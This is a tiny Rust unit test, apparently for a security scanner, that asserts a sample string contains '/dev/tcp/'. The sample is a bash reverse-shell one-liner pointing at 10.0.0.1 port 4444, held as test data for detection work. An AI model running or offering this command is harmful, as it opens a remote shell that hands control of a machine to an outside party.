#[test]
fn scanner_test() {
    let payload = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1";
    assert!(payload.contains("/dev/tcp/"));
}
